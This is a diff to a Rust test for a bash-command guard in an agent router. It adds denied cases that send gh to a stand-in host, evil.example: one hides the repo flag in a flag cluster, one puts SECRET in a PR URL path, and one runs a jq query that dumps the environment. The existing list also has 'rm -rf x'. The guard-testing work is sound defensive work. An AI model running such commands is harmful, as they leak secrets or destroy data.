@@ -61,6 +61,12 @@ fn router_bash_guard_judges_plain_words_so_shell_cannot_reassemble_a_denied_flag
         "git log -- *.rs",
         "gh pr list -R evil.example/a/b",
         "gh pr list --repo=evil.example/a/b",
+        // fix-round re-check: a -R inside a short-flag cluster, a PR URL, gh's jq over the environment
+        "gh pr list -dR evil.example/a/b",
+        "gh pr view -cRevil.example/a/b 1",
+        "gh pr view https://evil.example/o/SECRET/pull/1",
+        "gh pr list --json number -q env",
+        "gh pr view 1 --web",
         "scripts/router-worker.sh spawn a ../x .router/briefs/a.md opus",
         "rm -rf x",
         "claude -p hi",
@@ -79,6 +85,9 @@ fn router_bash_guard_judges_plain_words_so_shell_cannot_reassemble_a_denied_flag
         "git diff HEAD~1 HEAD^ -- src/main.rs".into(),
         "git log -1 --notes=mr --format=%N 9787799dccec525966570861689ccb6e2c2fc615".into(),
         "git show HEAD:src/main.rs".into(),
+        "gh pr view 12 --json title,state".into(),
+        "gh pr list --state open -L 5 --author vuluu".into(),
+        "gh pr status".into(),
         "scripts/router-worker.sh spawn e-x-w1 /Users/o/Keel-x .router/briefs/e-x-w1.md opus".into(),
         "scripts/router-worker.sh resume e-x-w1 0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b /Users/o/Keel-x .router/briefs/e-x-w1-r1.md sonnet".into(),
     ];
